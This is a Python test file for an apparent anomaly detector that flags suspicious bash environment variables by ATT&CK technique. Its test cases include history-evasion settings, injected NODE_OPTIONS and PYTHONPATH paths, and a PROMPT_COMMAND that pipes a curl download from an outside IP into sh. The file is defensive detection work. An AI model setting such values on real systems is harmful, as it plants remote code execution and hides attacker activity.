import os
import sys
import unittest

sys.path.insert(0, os.path.dirname(__file__))

from fixtures import make_proc  # noqa: E402
from test_signals import SignalBox  # noqa: E402

BASH = "/usr/bin/bash"
BASE = {"HOME": "/home/user1000", "PATH": "/usr/local/bin:/usr/bin", "SHELL": "/bin/bash", "TERM": "xterm-256color"}

CASES = [
    ({"HISTFILE": "/dev/null"}, "hist_disabled", "T1070.003", "HISTFILE=/dev/null"),
    ({"HISTSIZE": "0"}, "hist_disabled", "T1070.003", "HISTSIZE=0"),
    ({"HISTFILESIZE": "0"}, "hist_disabled", "T1070.003", "HISTFILESIZE=0"),
    ({"PYTHONPATH": "/usr/lib/python3.13/site-packages:/tmp/x"}, "pythonpath_tmp", "T1574", "PYTHONPATH=/tmp/x"),
    ({"NODE_PATH": "/dev/shm/mods"}, "pythonpath_tmp", "T1574", "NODE_PATH=/dev/shm/mods"),
    ({"NODE_OPTIONS": "--require /tmp/x.js"}, "node_options_inject", "T1574", "/tmp/x.js"),
    ({"NODE_OPTIONS": "--max-old-space-size=4096 --import=/home/user1000/.cache/hook.mjs"},
     "node_options_inject", "T1574", "/home/user1000/.cache/hook.mjs"),
    ({"NODE_OPTIONS": "-r /var/tmp/agent.js"}, "node_options_inject", "T1574", "/var/tmp/agent.js"),
    ({"PROMPT_COMMAND": "curl -s http://198.51.100.7/b | sh"}, "prompt_command", "T1546.004", "curl -s"),
]

NORMAL_DESKTOP = dict(BASE, **{
    "HISTSIZE": "10000", "HISTFILESIZE": "20000", "HISTFILE": "/home/user1000/.bash_history",
    "PROMPT_COMMAND": "__vsc_prompt_cmd_original; history -a",
    "NODE_OPTIONS": "--max-old-space-size=4096",
    "PYTHONPATH": "/home/user1000/proj/src",
    "NODE_PATH": "/home/user1000/.local/lib/node_modules",
    "STARSHIP_SHELL": "bash", "XDG_SESSION_TYPE": "wayland", "DISPLAY": ":0",
})


class EnvBox(SignalBox):
    def env_proc(self, pid, env):
        self.add_official("bash", "5.3.15-2", BASH)
        make_proc(self.proc, pid, BASH, environ=dict(BASE, **env))
        proc, _, code = self.scan_pid(pid)
        return proc, code


class EnvAnomalies(EnvBox):
    def test_table(self):
        pid = 800
        for env, key, technique, needle in CASES:
            with self.subTest(env=env):
                pid += 1
                proc, code = self.env_proc(pid, env)
                self.assert_signal(proc, key, technique, needle)
                self.assertEqual(proc.signal_keys, [key], proc.reasons)
                self.assertEqual(proc.weirdness_score, self.scores[key])
                self.assertEqual(proc.trust_level, self.weird.TrustLevel.OFFICIAL_REPO)
                self.assertIn(code, (0, 1, 2))

    def test_scores_match_plan(self):
        self.assertEqual(self.scores["hist_disabled"], 10)
        self.assertEqual(self.scores["pythonpath_tmp"], 10)
        self.assertEqual(self.scores["node_options_inject"], 20)
        self.assertEqual(self.scores["prompt_command"], 10)

    def test_normal_desktop_environ_scores_zero(self):
        proc, code = self.env_proc(820, NORMAL_DESKTOP)
        self.assertEqual(proc.signal_keys, [], proc.reasons)
        self.assertEqual(proc.weirdness_score, 0)
        self.assertEqual(code, 0)

    def test_known_prompt_integrations_not_scored(self):
        for value in ("starship_precmd", 'printf "\\033]0;%s\\007" "$PWD"', "__zoxide_hook",
                      "_direnv_hook", "__wezterm_semantic_precmd", "history -a; history -n"):
            with self.subTest(value=value):
                proc = self.weird.ProcessInfo(pid=0, name="bash", path=BASH, cmdline="bash", uid=1000)
                self.assertEqual(self.weird.check_env_anomalies(proc, dict(BASE, PROMPT_COMMAND=value)), 0, proc.reasons)

    def test_env_signals_combine(self):
        proc, code = self.env_proc(830, {"HISTFILE": "/dev/null", "NODE_OPTIONS": "--require /tmp/x.js"})
        self.assertEqual(sorted(proc.signal_keys), ["hist_disabled", "node_options_inject"])
        self.assertEqual(proc.weirdness_score, self.scores["hist_disabled"] + self.scores["node_options_inject"])
        self.assertIn("T1070.003", proc.attack)
        self.assertIn("T1574", proc.attack)
        self.assertTrue(any("HISTFILE=/dev/null" in r for r in proc.reasons), proc.reasons)
        self.assertTrue(any("/tmp/x.js" in r for r in proc.reasons), proc.reasons)

    def test_unreadable_environ_is_quiet(self):
        proc = self.weird.ProcessInfo(pid=0, name="bash", path=BASH, cmdline="bash", uid=1000)
        self.assertEqual(self.weird.check_env_anomalies(proc, None), 0)
        self.assertEqual(proc.reasons, [])


if __name__ == "__main__":
    unittest.main()
